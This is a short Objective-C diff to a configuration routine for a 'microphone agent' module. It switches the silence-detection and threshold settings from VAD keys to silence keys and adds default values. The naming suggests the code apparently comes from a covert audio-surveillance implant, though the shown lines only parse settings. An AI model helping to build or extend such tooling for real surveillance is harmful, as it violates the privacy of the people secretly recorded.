@@ -366,21 +366,21 @@
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type   = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
+  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
   // not used
   //  NSNumber *autos  = [aModule objectForKey: MODULE_MIC_AUTOSENSE_KEY];
-  //  NSNumber *sil    = [aModule objectForKey: MODULE_MIC_SILENCE_KEY];
-  //  NSNumber *thr    = [aModule objectForKey: MODULE_MIC_THRESHOLD_KEY];
-  NSNumber *vad    = [aModule objectForKey:MODULE_MIC_VAD_KEY];
-  NSNumber *vadThr = [aModule objectForKey: MODULE_MIC_VADTHRESHOLD_KEY];
-  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  //  NSNumber *vad    = [aModule objectForKey:MODULE_MIC_VAD_KEY];
+  //  NSNumber *vadThr = [aModule objectForKey: MODULE_MIC_VADTHRESHOLD_KEY];
+  NSNumber *sil    = [aModule objectForKey: MODULE_MIC_SILENCE_KEY];
+  NSNumber *thr    = [aModule objectForKey: MODULE_MIC_THRESHOLD_KEY];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
   memset(&micStruct, 0, sizeof(micStruct));
-  micStruct.detectSilence = (vad != nil ? [vad unsignedIntValue] : 0);
-  micStruct.silenceThreshold = (vadThr != nil ? [vadThr unsignedIntValue] : 0);
+  micStruct.detectSilence = (sil != nil ? [sil unsignedIntValue] : 5);
+  micStruct.silenceThreshold = (int)(thr != nil ? ([thr floatValue] * 100) : 22);
   
   data = [[NSData alloc] initWithBytes: &micStruct length: sizeof(microphoneAgentStruct_t)];
   
